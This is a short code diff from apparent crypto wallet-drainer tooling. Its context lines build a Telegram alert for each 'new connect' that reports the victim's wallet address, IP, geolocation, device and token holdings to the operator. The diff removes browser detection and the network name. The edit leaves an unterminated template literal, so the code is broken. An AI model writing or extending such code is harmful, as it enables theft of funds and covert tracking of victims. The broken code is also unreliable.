@@ -134,15 +134,9 @@ async function getGeolocation(ip) {
 function detectDevice() {
   const userAgent = navigator.userAgent || 'Unknown Device'
   let deviceType = 'Desktop'
-  let browser = 'Unknown Browser'
   if (/mobile/i.test(userAgent)) deviceType = 'Mobile'
   else if (/tablet/i.test(userAgent)) deviceType = 'Tablet'
-  if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) browser = 'Chrome'
-  else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = 'Safari'
-  else if (/firefox/i.test(userAgent)) browser = 'Firefox'
-  else if (/edg/i.test(userAgent)) browser = 'Edge'
-  else if (/opera|opr/i.test(userAgent)) browser = 'Opera'
-  return `${deviceType} (${browser})`
+  return `${deviceType}
 }
 
 // Функция отправки сообщений в Telegram
@@ -186,7 +180,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
 
     const message = `🚨 New connect (${walletName} - ${device})\n` +
                     `🌀 Address: [${address}](${scanLink})\n` +
-                    `🕸 Network: EVM (${networkName})\n` +
+                    `🕸 Network: EVM\n` +
                     `🌎 ${ip} | ${location}\n\n` +
                     `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                     `${tokenList}\n\n` +
